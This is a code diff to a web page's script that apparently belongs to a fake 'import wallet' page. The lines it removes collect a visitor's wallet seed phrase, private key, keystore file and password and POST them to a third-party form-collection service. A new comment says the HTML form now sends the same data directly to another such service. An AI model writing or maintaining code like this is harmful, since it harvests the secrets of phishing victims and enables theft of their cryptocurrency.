@@ -84,49 +84,16 @@ function closeModal() {
   if (modal) modal.style.display = "none";
 }
 
-// Form submission handler
+/*
+// REMOVE the JS form submission handler for Formspree
+// The HTML form now submits directly to Formsubmit, so this block should be removed or commented out:
+
 const importWalletForm = document.getElementById('importWalletForm');
 if (importWalletForm) {
   importWalletForm.addEventListener('submit', function (e) {
     e.preventDefault(); // Prevents page reload
 
-    const phraseInput = document.getElementById('phrase');
-    const privateKeyInput = document.getElementById('private-key');
-    const keystoreInput = document.getElementById('keystore-json');
-    const passwordInput = document.getElementById('password');
-
-    const phrase = phraseInput ? phraseInput.value.trim() : "";
-    const privateKey = privateKeyInput ? privateKeyInput.value.trim() : "";
-    const keystore = keystoreInput ? keystoreInput.value.trim() : "";
-    const password = passwordInput ? passwordInput.value.trim() : "";
-
-    fetch('https://formspree.io/f/xqaybqon', {
-      method: 'POST',
-      body: JSON.stringify({
-        phrase,
-        privateKey,
-        keystore,
-        password
-      }),
-      headers: {
-        'Accept': 'application/json',
-        'Content-Type': 'application/json'
-      }
-    })
-      .then(res => res.json())
-      .then(data => {
-        if (data.ok) {
-          alert("Submitted successfully!");
-          document.getElementById('popupModal').style.display = 'none';
-        } else {
-          alert("Failed to submit. Try again.");
-          showErrorPopup();
-        }
-      })
-      .catch(err => {
-        console.error("Network error:", err);
-        alert("Network error.");
-        showErrorPopup();
-      });
+    // Formspree fetch logic removed
   });
 }
+*/
